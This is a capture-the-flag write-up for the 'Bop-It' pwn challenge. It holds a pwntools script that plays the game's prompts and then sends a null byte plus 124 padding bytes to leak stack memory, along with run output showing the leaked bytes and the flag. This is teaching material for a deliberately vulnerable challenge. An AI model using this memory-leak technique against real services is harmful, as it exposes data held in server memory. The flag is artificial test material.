# Bop-It -- pwn -- 80pts/156solves

```
from pwn import *

def bop():
	p.sendline("B")
def pull():
	p.sendline("P")
def twist():
	p.sendline("T")
def flagit(arg):
	p.sendline(arg)

p = remote("shell.actf.co", 20702)

solved=0

while 1:
	s1 = str(p.recvline())
	if s1 == "Bop it!\n":
		info("B")
		p.sendline("B")
	elif s1 == "Pull it!\n":
		info("P")
		p.sendline("P")
	elif s1 == "Twist it!\n":
		info("T")
		p.sendline("T")
	else:
		break

if s1.startswith("Flag it"):
	info("F")
	xpl = ""
	xpl += "A"*124
	p.sendline("\x00"+xpl) #NULL byte para interromper a seleção de dados do 
								#input, passando a obter os dados da stack
	print p.recvall(1)
```

```
fex0r:~/C/A/bop-it
➤ python xpl.py 
[+] Opening connection to shell.actf.co on port 20702: Done
[*] B
[*] T
[*] B
[*] B
[*] T
[*] F
[+] Receiving all data: Done (161B)
[*] Closed connection to shell.actf.co port 20702
 was wrong. Better luck next time!
\x00\x00\x00\x00\x00b4^FBV\x00\x00`!�f.\x00\x00~\x00\x00\x00\x19\x00\x00\x00"@^FBV\x00\x00\x10\x90\x1eHBV\x00\x00"\x00\x00\x00\x00\x00\x00\x00\x00 ��@^FBV\x00\x00@^FBV\x00\x00\x18@^FBV\x00\x00"@^FBV\x00\x00actf{bopp1ty_bop_bOp_b0p}\x00\x8c\x19\x7f\x00\x00\x00
```